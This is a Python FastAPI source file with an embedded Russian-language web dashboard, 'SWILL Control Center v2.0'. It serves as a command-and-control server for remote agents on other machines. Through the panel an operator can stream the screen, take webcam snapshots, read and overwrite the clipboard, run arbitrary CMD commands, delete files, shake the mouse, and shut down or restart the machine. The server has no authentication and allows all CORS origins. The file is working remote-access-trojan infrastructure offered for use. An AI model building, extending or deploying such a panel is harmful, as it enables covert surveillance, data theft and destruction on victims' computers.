import os
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from typing import Dict, Set

app = FastAPI()

# Разрешаем CORS для беспрепятственного подключения агента
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

active_agents: Dict[str, WebSocket] = {}
active_admins: Set[WebSocket] = set()

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>SWILL Control Panel v2.0</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #121212; color: #e0e0e0; margin: 0; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #292929; padding-bottom: 20px; }
        .device-selector { padding: 10px; background: #1e1e1e; color: #fff; border: 1px solid #3a3a3a; border-radius: 5px; font-size: 16px; }
        .main-grid { display: grid; grid-template-columns: 350px 1fr; gap: 20px; margin-top: 20px; }
        .panel { background: #1e1e1e; border: 1px solid #2d2d2d; border-radius: 8px; padding: 15px; margin-bottom: 15px; }
        .panel h3 { margin-top: 0; border-bottom: 1px solid #3a3a3a; padding-bottom: 8px; color: #007bff; }
        .btn { display: block; width: 100%; padding: 10px; margin: 8px 0; background: #2b2b2b; color: #fff; border: 1px solid #3a3a3a; border-radius: 4px; cursor: pointer; text-align: left; font-weight: bold; transition: 0.2s; }
        .btn:hover { background: #007bff; border-color: #007bff; }
        .btn-danger { background: #5a1818; border-color: #721c24; }
        .btn-danger:hover { background: #dc3545; border-color: #dc3545; }
        .input-group { margin: 10px 0; }
        .input-group label { display: block; font-size: 12px; color: #aaa; margin-bottom: 4px; }
        .input-style { width: calc(100% - 16px); padding: 8px; background: #121212; border: 1px solid #3a3a3a; color: #fff; border-radius: 4px; }
        .console { background: #000; border: 1px solid #2d2d2d; height: 200px; overflow-y: auto; padding: 10px; font-family: monospace; font-size: 13px; color: #00ff00; border-radius: 5px; margin-top: 15px; }
        #screen-viewer { width: 100%; max-height: 600px; border: 2px solid #2d2d2d; background: #000; border-radius: 5px; object-fit: contain; }
        .status-badge { display: inline-block; width: 12px; height: 12px; border-radius: 50%; background: #dc3545; margin-right: 8px; }
        .status-online { background: #28a745; }
        .flex-row { display: flex; gap: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>SWILL Control Center v2.0</h1>
            <div>
                <span id="status-light" class="status-badge"></span>
                <select id="device-select" class="device-selector" onchange="connectToDevice()">
                    <option value="">-- Выберите устройство --</option>
                </select>
            </div>
        </header>

        <div class="main-grid">
            <div>
                <div class="panel">
                    <h3>Мониторинг и Медиа</h3>
                    <button class="btn" onclick="sendCommand('screen_on')">▶ Запустить Стрим Экрана</button>
                    <button class="btn" onclick="sendCommand('screen_off')">⏸ Остановить Стрим</button>
                    <button class="btn" onclick="sendCommand('webcam_snap')">📸 Снимок с Веб-камеры</button>
                    <button class="btn" onclick="sendCommand('pc_info')">💻 Характеристики Системы</button>
                </div>

                <div class="panel">
                    <h3>Интерактивные Действия</h3>
                    
                    <div class="input-group">
                        <label>Открыть сайт в браузере (URL):</label>
                        <div class="flex-row">
                            <input type="text" id="url-input" class="input-style" placeholder="https://google.com">
                            <button class="btn" style="width: auto; margin: 0;" onclick="sendWithPayload('open_url', 'url-input')">Открыть</button>
                        </div>
                    </div>

                    <div class="input-group">
                        <label>Сообщение пользователю (MessageBox):</label>
                        <div class="flex-row">
                            <input type="text" id="msg-input" class="input-style" placeholder="Привет!">
                            <button class="btn" style="width: auto; margin: 0;" onclick="sendWithPayload('show_msg', 'msg-input')">Отобразить</button>
                        </div>
                    </div>

                    <div class="input-group">
                        <label>Запустить команду (CMD):</label>
                        <div class="flex-row">
                            <input type="text" id="cmd-input" class="input-style" placeholder="ipconfig /all">
                            <button class="btn" style="width: auto; margin: 0;" onclick="sendWithPayload('run_cmd', 'cmd-input')">Выполнить</button>
                        </div>
                    </div>
                </div>

                <div class="panel">
                    <h3>Файловый менеджер и буфер</h3>
                    <button class="btn" onclick="sendCommand('clipboard_get')">📋 Прочитать Буфер Обмена</button>
                    
                    <div class="input-group">
                        <label>Записать текст в буфер:</label>
                        <div class="flex-row">
                            <input type="text" id="clip-set-input" class="input-style" placeholder="Новый текст...">
                            <button class="btn" style="width: auto; margin: 0;" onclick="sendWithPayload('clipboard_set', 'clip-set-input')">Записать</button>
                        </div>
                    </div>

                    <div class="input-group">
                        <label>Полный путь для удаления файла/папки:</label>
                        <div class="flex-row">
                            <input type="text" id="del-input" class="input-style" placeholder="C:\\path\\to\\file.txt">
                            <button class="btn btn-danger" style="width: auto; margin: 0;" onclick="sendWithPayload('file_delete', 'del-input')">Удалить</button>
                        </div>
                    </div>
                </div>

                <div class="panel">
                    <h3>Система и Питание</h3>
                    <button class="btn" onclick="sendCommand('get_processes')">⚙ Список процессов</button>
                    <button class="btn" onclick="sendCommand('crazy_mouse')">🐭 Хаотичное движение мыши</button>
                    <button class="btn btn-danger" onclick="sendCommand('shutdown')">🔌 Выключить ПК</button>
                    <button class="btn btn-danger" onclick="sendCommand('restart')">🔄 Перезагрузить ПК</button>
                </div>
            </div>

            <div>
                <div class="panel">
                    <h3>Трансляция (Экран / Камера)</h3>
                    <img id="screen-viewer" src="" alt="Экран устройства появится здесь при запуске трансляции...">
                </div>

                <div class="panel">
                    <h3>Консоль событий и отчетов</h3>
                    <div id="log-console" class="console">Панель управления запущена. Выберите активное устройство вверху для начала работы.</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let wsAdmin = null;
        let selectedDevice = "";

        async function updateDeviceList() {
            try {
                let response = await fetch('/api/devices');
                let devices = await response.json();
                let select = document.getElementById('device-select');
                
                let currentVal = select.value;
                select.innerHTML = '<option value="">-- Выберите устройство --</option>';
                
                devices.forEach(dev => {
                    let opt = document.createElement('option');
                    opt.value = dev;
                    opt.innerHTML = dev;
                    if(dev === currentVal) opt.selected = true;
                    select.appendChild(opt);
                });
            } catch (e) {
                console.error("Ошибка получения списка устройств:", e);
            }
        }

        function connectToDevice() {
            selectedDevice = document.getElementById('device-select').value;
            if (!selectedDevice) {
                document.getElementById('status-light').className = "status-badge";
                return;
            }

            if (wsAdmin) wsAdmin.close();

            let protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
            wsAdmin = new WebSocket(`${protocol}//${window.location.host}/ws/admin/${selectedDevice}`);
            
            wsAdmin.onopen = () => {
                document.getElementById('status-light').className = "status-badge status-online";
                logConsole(`Подключено к управлению устройством: ${selectedDevice}`);
            };

            wsAdmin.onmessage = (event) => {
                if (typeof event.data === "string") {
                    try {
                        let data = JSON.parse(event.data);
                        if (data.type === "log") {
                            logConsole(data.payload);
                        }
                    } catch(e) {
                        logConsole("Данные: " + event.data);
                    }
                } else {
                    let blob = event.data;
                    let url = URL.createObjectURL(blob);
                    let viewer = document.getElementById('screen-viewer');
                    if (viewer.src) URL.revokeObjectURL(viewer.src);
                    viewer.src = url;
                }
            };

            wsAdmin.onclose = () => {
                document.getElementById('status-light').className = "status-badge";
                logConsole("Соединение с устройством потеряно.");
            };
        }

        function sendCommand(action) {
            if (!wsAdmin || wsAdmin.readyState !== WebSocket.OPEN) {
                alert("Выберите активное устройство и дождитесь соединения!");
                return;
            }
            wsAdmin.send(JSON.stringify({ "command": action }));
            logConsole(`Отправлена команда: [${action}]`);
        }

        function sendWithPayload(action, inputId) {
            let inputVal = document.getElementById(inputId).value;
            if (!inputVal) {
                alert("Поле ввода не должно быть пустым!");
                return;
            }
            if (!wsAdmin || wsAdmin.readyState !== WebSocket.OPEN) {
                alert("Выберите активное устройство и дождитесь соединения!");
                return;
            }
            wsAdmin.send(JSON.stringify({ "command": action, "payload": inputVal }));
            logConsole(`Отправлена команда [${action}] с параметром: "${inputVal}"`);
            document.getElementById(inputId).value = ""; // Очищаем поле ввода
        }

        function logConsole(text) {
            let consoleDiv = document.getElementById('log-console');
            consoleDiv.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${text.replace(/\\n/g, '<br>')}`;
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
        }

        setInterval(updateDeviceList, 5000);
        updateDeviceList();
    </script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse)
async def get_dashboard():
    return HTMLResponse(content=HTML_TEMPLATE)

@app.get("/api/devices")
async def get_devices():
    return list(active_agents.keys())

@app.get("/ping")
async def ping():
    return {"status": "alive"}

@app.websocket("/ws/agent/{device_id}")
async def agent_endpoint(websocket: WebSocket, device_id: str):
    await websocket.accept()
    active_agents[device_id] = websocket
    print(f"[+] Подключен агент: {device_id}")
    
    try:
        while True:
            data = await websocket.receive()
            if "bytes" in data:
                # Пересылаем медиа-данные (скриншот или снимок камеры)
                for admin in active_admins:
                    await admin.send_bytes(data["bytes"])
            elif "text" in data:
                # Пересылаем логи работы
                for admin in active_admins:
                    await admin.send_text(data["text"])
    except WebSocketDisconnect:
        print(f"[-] Отключен агент: {device_id}")
    finally:
        if device_id in active_agents:
            del active_agents[device_id]

@app.websocket("/ws/admin/{device_id}")
async def admin_endpoint(websocket: WebSocket, device_id: str):
    await websocket.accept()
    active_admins.add(websocket)
    try:
        while True:
            data = await websocket.receive_json()
            if device_id in active_agents:
                await active_agents[device_id].send_json(data)
    except WebSocketDisconnect:
        pass
    finally:
        active_admins.remove(websocket)

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)